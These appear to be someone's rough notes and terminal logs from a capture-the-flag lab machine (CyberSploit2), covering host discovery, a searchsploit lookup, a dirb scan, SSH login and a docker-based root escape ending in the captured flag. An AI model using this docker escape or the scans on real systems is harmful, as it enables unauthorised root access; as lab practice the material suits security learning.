kernel saves the basic configurings 

ifconfig ----takeaway-----network id
net discover------mac address----OUI(first 24 bits)---helps identify which brand it belongs to
┌──(root㉿kali)-[~]
└─# searchsploit httpd 2.4.37
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service              | openbsd/dos/41278.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


this is not useful i aint trynna dos attack i wanna log there
even tho i could do this i cat cause this is a txt filr if that was a python file i could have 

Priviledge escalation

kernal exploitation
uname -a



[shailendra@localhost ~]$ ls
hint.txt


from the hint.txt i found docker 
go to gtfobins and find exploit for docker

┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.56.103/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jul 31 04:46:59 2026
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.103/ ----
+ http://192.168.56.103/cgi-bin/ (CODE:403|SIZE:217)                                                    
+ http://192.168.56.103/index.html (CODE:200|SIZE:3471)                                                 
==> DIRECTORY: http://192.168.56.103/noindex/                                                           
                                                                                                        
---- Entering directory: http://192.168.56.103/noindex/ ----
==> DIRECTORY: http://192.168.56.103/noindex/common/                                                    
+ http://192.168.56.103/noindex/index (CODE:200|SIZE:4006)                                              
+ http://192.168.56.103/noindex/index.html (CODE:200|SIZE:4006)                                         
                                                                                                        
---- Entering directory: http://192.168.56.103/noindex/common/ ----
==> DIRECTORY: http://192.168.56.103/noindex/common/css/                                                
==> DIRECTORY: http://192.168.56.103/noindex/common/fonts/                                              
==> DIRECTORY: http://192.168.56.103/noindex/common/images/                                             
                                                                                                        
---- Entering directory: http://192.168.56.103/noindex/common/css/ ----
+ http://192.168.56.103/noindex/common/css/styles (CODE:200|SIZE:71634)                                 
                                                                                                        
---- Entering directory: http://192.168.56.103/noindex/common/fonts/ ----
^C> Testing: http://192.168.56.103/noindex/common/fonts/invoices                                        
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ ssh shailendra@192.168.56.103
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
shailendra@192.168.56.103's password: 
Last login: Sun Jul 19 01:13:48 2026 from 192.168.56.102
[shailendra@localhost ~]$ ls
hint.txt
[shailendra@localhost ~]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for shailendra: 
shailendra is not in the sudoers file.  This incident will be reported.
[shailendra@localhost ~]$ sudo su
[sudo] password for shailendra: 
shailendra is not in the sudoers file.  This incident will be reported.
[shailendra@localhost ~]$ pwd
/home/shailendra
[shailendra@localhost ~]$ cd /root
-bash: cd: /root: Permission denied
[shailendra@localhost ~]$ ls -la
total 20
drwx------. 2 shailendra shailendra  99 Jul 15  2020 .
drwxr-xr-x. 4 root       root        38 Jul 15  2020 ..
-rw-------. 1 shailendra shailendra 612 Jul 15  2020 .bash_history
-rw-r--r--. 1 shailendra shailendra  18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 shailendra shailendra 141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 shailendra shailendra 312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 shailendra shailendra   7 Jul 15  2020 hint.txt
[shailendra@localhost ~]$ sudo -l
[sudo] password for shailendra: 

Sorry, try again.
[sudo] password for shailendra: 
^Csudo: 2 incorrect password attempts
[shailendra@localhost ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
sh-4.4# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
sh-4.4# cd /root
sh-4.4# ls
anaconda-ks.cfg  flag.txt  get-docker.sh  logs}
sh-4.4# cat flag.txt
 __    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 
sh-4.4# 
